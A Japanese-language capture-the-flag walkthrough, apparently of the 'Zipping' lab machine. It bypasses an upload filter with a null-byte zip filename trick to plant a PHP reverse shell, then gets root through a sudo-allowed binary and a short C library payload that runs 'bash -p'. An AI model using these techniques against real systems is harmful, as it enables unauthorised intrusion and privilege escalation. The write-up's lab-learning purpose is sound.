walkthroughなしで解けた問題（掲示板のヒントは使用した）

#### nmap
![](/images/20230830053010.png)

Webにアクセス
![](/images/20230830053128.png)

右上の「Work with Us」でファイルがアップロードできる
![](/images/20230830053257.png)
zipで圧縮したPDFファイルのみアップできることが書いてある。
リーバースシェルをとるためにpentestmonkyのPHPコードを「shell.phpB.pdf」で保存する。
zipで圧縮する
![](/images/20230830053651.png)

hexediterでファイル名の「B」をnull文字（00）に書き換える（出力されるファイル名の方）
![](/images/20230830054020.png)

![](/images/20230830054128.png)

圧縮ファイルをアップロードする
![](/images/20230830054248.png)
アップロードされたファイルの場所が表示されるので右クリックで別のタブで開く

ncでリスナーを起動しておく
![](/images/20230830054648.png)

アップしたファイルのファイル名が表示されるので後ろの空白と「.pdf」の部分を削除してエンターを押せばリバースシェルが獲れる
![](/images/20230830054420.png)

![](/images/20230830054830.png)

![](/images/20230830055124.png)
rektsuのホームディレクトリにいけばuser.txtファイルがある

#### 権限昇格
```shell
sudo -l
```

![](/images/20230830055507.png)
実行ファイルのようなのでこのファイルをローカルに持ってきて調べる
![](/images/20230830055701.png)

![](/images/20230830055846.png)
stringsで文字を見てみるとパスワードらしきものがある

ここで行き詰まったので https://breachforums.is/Thread-zipping?page=4 でヒントをもらった
![](/images/20230830060132.png)
ユーザーのカレントディレクトリで「exploit.c」ファイルを作成
![](/images/20230830060325.png)

コンパイルして実行すればrootになれる
![](/images/20230830060534.png)


## **コードの説明**

```c
#include <unistd.h>  
  
void begin (void) __attribute__((destructor));  
  
void begin (void) {  
    system("bash -p");  
}
```

>unistd.h:UNIX標準に関するヘッダファイル
>\_\_attribute__によって，宣言をする際に特別な属性を指定することができます．このキーワードの後に，二重の丸括弧（()）に囲まれた属性指定が続きます．現在，9個の属性，  
       noreturn，const，format,  no_instrument_function，section ,  constructor，destructor，unused，weak  
 destructor属性を指定された関数は，main()関数の実行が終了した後に，自動的に呼び出されるようになります．この機能は実行後の後処理に役に立ちます．
 